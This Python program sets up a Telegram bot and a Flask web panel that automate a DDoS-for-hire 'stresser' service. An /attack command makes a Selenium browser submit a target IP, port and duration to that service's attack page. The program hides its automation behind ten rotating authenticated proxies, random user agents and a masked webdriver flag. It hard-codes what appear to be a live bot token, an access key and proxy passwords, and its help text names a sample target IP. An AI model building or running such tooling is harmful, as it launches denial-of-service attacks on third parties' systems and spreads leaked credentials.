import os
import json
import time
import pickle
import threading
import re
import random
import base64
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from pyvirtualdisplay import Display
import logging
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== CONFIG ====================
TELEGRAM_BOT_TOKEN = "8739857934:AAFC8icETbmsxjYIqxcOmF8MHD_xg7xHZdo"
ACCESS_KEY = "2d1139b0c49e3019b0a54a5f6e60062957db4353b4daf6259b8a2752276d26b4"
LOGIN_URL = "https://satellitestress.st/login"
ATTACK_URL = "https://satellitestress.st/attack"
COOKIES_FILE = "cookies.pkl"
PORT = int(os.environ.get("PORT", 5000))
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", f"http://localhost:{PORT}")

# ==================== YOUR PROXIES ====================
PROXY_LIST = [
    {
        "server": "31.59.20.176:6754",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "23.95.150.145:6114",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "198.23.239.134:6540",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "45.38.107.97:6014",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "107.172.163.27:6543",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "198.105.121.200:6462",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "64.137.96.74:6641",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "216.10.27.159:6837",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "142.111.67.146:5611",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    },
    {
        "server": "194.39.32.164:6461",
        "username": "lmfaxayd",
        "password": "ujzc9rzsc6op"
    }
]

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== FLASK APP ====================
app = Flask(__name__)
app.secret_key = os.urandom(24)

# ==================== BROWSER MANAGER with Authenticated Proxies ====================
class BrowserManager:
    def __init__(self):
        self.driver = None
        self.display = None
        self.is_logged_in = False
        self.login_time = None
        self.current_proxy = None
        
    def get_random_proxy(self):
        """Get random proxy from your list"""
        return random.choice(PROXY_LIST)
    
    def get_proxy_auth_extension(self, proxy):
        """Create Chrome extension for proxy authentication"""
        proxy_username = proxy["username"]
        proxy_password = proxy["password"]
        proxy_server = proxy["server"]
        
        # Create extension directory
        extension_dir = os.path.join(os.getcwd(), "proxy_auth")
        os.makedirs(extension_dir, exist_ok=True)
        
        # Create manifest.json
        manifest = {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Proxy Auth",
            "permissions": [
                "proxy",
                "tabs",
                "unlimitedStorage",
                "storage",
                "<all_urls>",
                "webRequest",
                "webRequestBlocking"
            ],
            "background": {
                "scripts": ["background.js"]
            },
            "minimum_chrome_version": "22.0.0"
        }
        
        with open(os.path.join(extension_dir, "manifest.json"), "w") as f:
            json.dump(manifest, f)
        
        # Create background.js for proxy auth
        background_js = f"""
        var config = {{
            mode: "fixed_servers",
            rules: {{
                singleProxy: {{
                    scheme: "http",
                    host: "{proxy_server.split(':')[0]}",
                    port: parseInt("{proxy_server.split(':')[1]}")
                }},
                bypassList: ["localhost"]
            }}
        }};
        
        chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
        
        chrome.webRequest.onAuthRequired.addListener(
            function(details) {{
                return {{
                    authCredentials: {{
                        username: "{proxy_username}",
                        password: "{proxy_password}"
                    }}
                }};
            }},
            {{urls: ["<all_urls>"]}},
            ["blocking"]
        );
        """
        
        with open(os.path.join(extension_dir, "background.js"), "w") as f:
            f.write(background_js)
        
        return extension_dir
        
    def start(self):
        """Start browser with random proxy from your list"""
        logger.info("🚀 Starting browser with proxy...")
        
        try:
            # Get random proxy
            proxy = self.get_random_proxy()
            self.current_proxy = proxy
            logger.info(f"🌐 Using proxy: {proxy['server']}")
            
            # Create proxy auth extension
            extension_dir = self.get_proxy_auth_extension(proxy)
            
            # Virtual display
            self.display = Display(visible=0, size=(1920, 1080))
            self.display.start()
            
            # Chrome options
            options = Options()
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--headless=new")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--disable-web-security")
            options.add_argument("--allow-running-insecure-content")
            options.add_argument("--ignore-certificate-errors")
            options.add_argument("--ignore-ssl-errors")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            
            # Random user agent
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            options.add_argument(f'--user-agent={random.choice(user_agents)}')
            
            # Load proxy auth extension
            options.add_argument(f'--load-extension={extension_dir}')
            
            # Start driver
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            
            # Execute stealth scripts
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            logger.info("✅ Browser started with proxy")
            
            # Test IP
            self.test_ip()
            
            # Load saved session
            self.load_session()
            
        except Exception as e:
            logger.error(f"Browser start error: {e}")
    
    def test_ip(self):
        """Test current IP"""
        try:
            self.driver.get("https://api.ipify.org?format=json")
            time.sleep(2)
            page_text = self.driver.page_source
            logger.info(f"📍 Current IP: {page_text}")
        except:
            logger.warning("⚠️ Could not detect IP")
    
    def load_session(self):
        """Load saved cookies"""
        try:
            if os.path.exists(COOKIES_FILE):
                with open(COOKIES_FILE, 'rb') as f:
                    cookies = pickle.load(f)
                
                self.driver.get(LOGIN_URL)
                time.sleep(3)
                
                for cookie in cookies:
                    try:
                        self.driver.add_cookie(cookie)
                    except:
                        pass
                
                logger.info("✅ Session loaded")
                self.check_login()
        except Exception as e:
            logger.error(f"Session load error: {e}")
    
    def save_session(self):
        """Save cookies"""
        try:
            cookies = self.driver.get_cookies()
            with open(COOKIES_FILE, 'wb') as f:
                pickle.dump(cookies, f)
            logger.info(f"✅ Saved {len(cookies)} cookies")
            return True
        except Exception as e:
            logger.error(f"Save error: {e}")
            return False
    
    def check_login(self):
        """Check if logged in"""
        try:
            self.driver.get(ATTACK_URL)
            time.sleep(3)
            
            if "attack" in self.driver.current_url or "dashboard" in self.driver.current_url:
                self.is_logged_in = True
                self.login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                logger.info("✅ Already logged in")
                return True
        except Exception as e:
            logger.error(f"Check login error: {e}")
        
        self.is_logged_in = False
        return False
    
    def attack(self, ip, port, duration):
        """Launch attack"""
        try:
            self.driver.get(ATTACK_URL)
            time.sleep(3)
            
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "ip"))
            )
            
            ip_input = self.driver.find_element(By.NAME, "ip")
            ip_input.clear()
            ip_input.send_keys(ip)
            
            port_input = self.driver.find_element(By.NAME, "port")
            port_input.clear()
            port_input.send_keys(str(port))
            
            time_input = self.driver.find_element(By.NAME, "time")
            time_input.clear()
            time_input.send_keys(str(duration))
            
            submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_btn.click()
            time.sleep(3)
            
            logger.info(f"✅ Attack sent to {ip}:{port}")
            return True
            
        except Exception as e:
            logger.error(f"Attack error: {e}")
            return False

# ==================== TELEGRAM BOT ====================
class TelegramBot:
    def __init__(self, browser):
        self.browser = browser
        self.application = None
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "🚀 **Satellite Stress Bot**\n\n"
            "✅ Running with 10 Premium Proxies\n"
            f"🌐 Web: {RENDER_URL}\n\n"
            "**Commands:**\n"
            "/status - Check login\n"
            "/attack IP PORT TIME - Launch attack\n"
            "/proxy - Show current proxy\n"
            "/help - Show help",
            parse_mode="Markdown"
        )
    
    async def proxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if self.browser.current_proxy:
            await update.message.reply_text(
                f"🌐 **Current Proxy:**\n"
                f"Server: `{self.browser.current_proxy['server']}`\n"
                f"Status: ✅ Active",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ No proxy active")
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "📚 **Usage:**\n\n"
            "1. Open web interface\n"
            "2. Login manually\n"
            "3. Save session\n"
            "4. Use /attack\n\n"
            "**Example:**\n"
            "`/attack 104.29.138.132 80 120`\n\n"
            f"**Access Key:** `{ACCESS_KEY}`",
            parse_mode="Markdown"
        )
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.browser.check_login()
        
        text = f"📊 **Status:**\n\n"
        text += f"• Login: {'✅ LOGGED IN' if self.browser.is_logged_in else '❌ NOT LOGGED IN'}\n"
        text += f"• Session: {'✅ SAVED' if os.path.exists(COOKIES_FILE) else '❌ NOT SAVED'}\n"
        text += f"• Last Login: {self.browser.login_time or 'Never'}\n"
        if self.browser.current_proxy:
            text += f"• Proxy: `{self.browser.current_proxy['server']}`"
        
        await update.message.reply_text(text, parse_mode="Markdown")
    
    async def attack_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.browser.is_logged_in:
            await update.message.reply_text(
                "❌ **Not Logged In**\n\n"
                f"Please login via web interface first:\n{RENDER_URL}",
                parse_mode="Markdown"
            )
            return
        
        if len(context.args) < 3:
            await update.message.reply_text(
                "❌ **Invalid Format**\n\n"
                "Usage: /attack IP PORT TIME\n"
                "Example: /attack 104.29.138.132 80 120",
                parse_mode="Markdown"
            )
            return
        
        ip = context.args[0]
        port = context.args[1]
        duration = context.args[2]
        
        if not re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
            await update.message.reply_text("❌ Invalid IP address")
            return
        
        await update.message.reply_text(
            f"🚀 **Launching Attack...**\n\n"
            f"Target: `{ip}`\n"
            f"Port: `{port}`\n"
            f"Duration: `{duration}s`",
            parse_mode="Markdown"
        )
        
        success = await asyncio.get_event_loop().run_in_executor(
            None, self.browser.attack, ip, port, duration
        )
        
        if success:
            await update.message.reply_text(
                f"✅ **Attack Launched!**\n\n"
                f"`{ip}:{port}` for {duration} seconds",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Attack failed. Please try again.")
    
    def setup(self):
        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(CommandHandler("proxy", self.proxy_command))
        self.application.add_handler(CommandHandler("attack", self.attack_command))
        return self.application
    
    def run(self):
        self.setup()
        logger.info("🤖 Telegram bot started")
        self.application.run_polling()

# ==================== HTML TEMPLATE ====================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Satellite Stress Bot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        .header {
            background: linear-gradient(135deg, #2563eb, #7c3aed);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 { font-size: 28px; margin-bottom: 10px; }
        .content { padding: 30px; }
        .status-card {
            background: #f8fafc;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .status-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #e2e8f0;
        }
        .status-row:last-child { border-bottom: none; }
        .badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        .badge-success { background: #22c55e; color: white; }
        .badge-warning { background: #eab308; color: white; }
        .key-box {
            background: #0f172a;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 12px;
            font-family: monospace;
            word-break: break-all;
            margin: 20px 0;
        }
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin: 5px 0;
            color: white;
            transition: all 0.3s;
        }
        .btn-primary { background: #2563eb; }
        .btn-success { background: #22c55e; }
        .btn-warning { background: #eab308; }
        .btn:hover { transform: translateY(-2px); }
        .telegram-link {
            display: block;
            text-align: center;
            padding: 15px;
            background: #1e293b;
            color: white;
            text-decoration: none;
            border-radius: 12px;
            margin-top: 20px;
        }
        .footer {
            text-align: center;
            padding: 20px;
            background: #f8fafc;
            color: #64748b;
            font-size: 12px;
        }
        .proxy-note {
            background: #dbeafe;
            color: #1e40af;
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐍 Satellite Stress Bot</h1>
            <p>10 Premium Proxies | Rotating IPs</p>
        </div>
        
        <div class="content">
            <div class="proxy-note">
                🌐 Using 10 rotating proxies to bypass IP blocks
            </div>
            
            <div class="status-card">
                <div class="status-row">
                    <span>Login Status:</span>
                    <span>
                        <span id="loginText">{{ 'Logged In' if is_logged_in else 'Not Logged In' }}</span>
                        <span id="loginBadge" class="badge {{ 'badge-success' if is_logged_in else 'badge-warning' }}">
                            {{ 'ACTIVE' if is_logged_in else 'INACTIVE' }}
                        </span>
                    </span>
                </div>
                <div class="status-row">
                    <span>Session File:</span>
                    <span id="sessionText">{{ '✅ Saved' if session_exists else '❌ Not Saved' }}</span>
                </div>
                <div class="status-row">
                    <span>Last Login:</span>
                    <span id="loginTime">{{ login_time or 'Never' }}</span>
                </div>
            </div>
            
            <div class="key-box">
                <strong>🔑 Access Key:</strong><br>
                {{ access_key }}
            </div>
            
            <button class="btn btn-primary" onclick="window.open('{{ login_url }}', '_blank')">
                🌐 Open Login Page (New Tab)
            </button>
            <button class="btn btn-success" onclick="saveSession()">💾 Save Session</button>
            <button class="btn btn-warning" onclick="checkStatus()">🔄 Check Status</button>
            
            <a href="https://t.me/satellitestress_bot" class="telegram-link" target="_blank">
                📱 Open Telegram Bot
            </a>
            
            <p style="text-align: center; margin-top: 20px; font-size: 12px; color: #64748b;">
                /attack 104.29.138.132 80 120
            </p>
        </div>
        
        <div class="footer">
            Render URL: {{ render_url }} | 10 Proxies Active
        </div>
    </div>
    
    <script>
        async function saveSession() {
            const btn = event.target;
            btn.textContent = '💾 Saving...';
            btn.disabled = true;
            
            try {
                const res = await fetch('/save-session', {method: 'POST'});
                const data = await res.json();
                alert(data.success ? '✅ Session saved!' : '❌ ' + data.message);
            } catch (e) {
                alert('❌ Error: ' + e.message);
            } finally {
                btn.textContent = '💾 Save Session';
                btn.disabled = false;
                checkStatus();
            }
        }
        
        async function checkStatus() {
            try {
                const res = await fetch('/status');
                const data = await res.json();
                
                document.getElementById('loginText').textContent = data.is_logged_in ? 'Logged In' : 'Not Logged In';
                document.getElementById('loginBadge').textContent = data.is_logged_in ? 'ACTIVE' : 'INACTIVE';
                document.getElementById('loginBadge').className = 'badge ' + (data.is_logged_in ? 'badge-success' : 'badge-warning');
                document.getElementById('sessionText').textContent = data.session_exists ? '✅ Saved' : '❌ Not Saved';
                document.getElementById('loginTime').textContent = data.login_time || 'Never';
            } catch (e) {
                console.error(e);
            }
        }
        
        setInterval(checkStatus, 5000);
    </script>
</body>
</html>
"""

# ==================== FLASK ROUTES ====================
browser = BrowserManager()

@app.route('/')
def index():
    return render_template_string(
        HTML,
        is_logged_in=browser.is_logged_in,
        session_exists=os.path.exists(COOKIES_FILE),
        login_time=browser.login_time,
        access_key=ACCESS_KEY,
        login_url=LOGIN_URL,
        render_url=RENDER_URL
    )

@app.route('/status')
def get_status():
    return jsonify({
        'is_logged_in': browser.is_logged_in,
        'session_exists': os.path.exists(COOKIES_FILE),
        'login_time': browser.login_time
    })

@app.route('/save-session', methods=['POST'])
def save_session():
    if browser.save_session():
        browser.check_login()
        return jsonify({'success': True})
    return jsonify({'success': False, 'message': 'No cookies found'})

# ==================== MAIN ====================
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def run_telegram():
    try:
        bot = TelegramBot(browser)
        bot.run()
    except Exception as e:
        logger.error(f"Telegram bot error: {e}")

if __name__ == '__main__':
    print("="*50)
    print("🚀 Starting Satellite Stress Bot")
    print("📋 Loaded 10 Premium Proxies")
    print("="*50)
    
    # Start browser
    browser.start()
    browser.check_login()
    
    # Start Flask
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Run Telegram bot
    run_telegram()
